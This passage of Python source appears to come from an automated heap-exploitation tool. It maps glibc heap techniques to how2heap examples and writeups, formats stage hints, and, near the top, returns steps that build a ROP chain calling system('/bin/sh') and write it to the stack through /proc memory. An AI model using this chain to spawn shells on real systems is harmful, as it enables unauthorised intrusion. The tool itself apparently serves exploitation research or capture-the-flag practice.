        Requires: /proc filesystem accessible with write permission.
        """
        return [
            {"op": "ROP_CHAIN", "var": "_rop_chain",
             "gadgets": ["ret", "ret", "ret", "pop_rdi", "binsh", "system"],
             "note": "ret3 + pop_rdi_ret + binsh + system"},
            {"op": "PROC_MEM_WRITE",
             "addr_expr": "stack_leak",
             "data_expr": "_rop_chain",
             "note": "write_rop_chain_to_stack"},
        ]

    # ─── Lookup helpers ─────────────────────────────────────────────────

    @staticmethod
    def all_technique_sources(glibc_version: str) -> Dict[str, List[str]]:
        """Build complete mapping of KB technique → how2heap source files."""
        result = {}
        for tid, filenames in TechniqueIRGenerator.HOW2HEAP_SOURCE.items():
            if not filenames:
                result[tid] = []
                continue
            sources = TechniqueIRGenerator.get_how2heap_sources(tid, glibc_version)
            result[tid] = sources
        return result

    @staticmethod
    def format_hint(technique_id: str, glibc_version: str, produces: str) -> str:
        """Format a human-readable hint string for a technique."""
        name = technique_id.replace("_", " ").title()
        lines = [f"# Stage: {produces} via {technique_id} ({name})"]
        sources = TechniqueIRGenerator.get_how2heap_sources(technique_id, glibc_version)
        if sources:
            for s in sources:
                # Make path relative
                rel = os.path.relpath(s)
                lines.append(f"#   See how2heap: {rel}")
        else:
            mid = "data/how2heap_sources"
            if technique_id in ("unsortedbin_leak", "environ_leak"):
                lines.append(f"#   [NOTE] No dedicated how2heap .c file for {technique_id}.")
                lines.append(f"#   Read related writeups in data/writeups/ or see KB: data/knowledge/heap_techniques.json")
            else:
                lines.append(f"#   [NOTE] No how2heap source found for {technique_id}.")
        return "\n".join(lines)
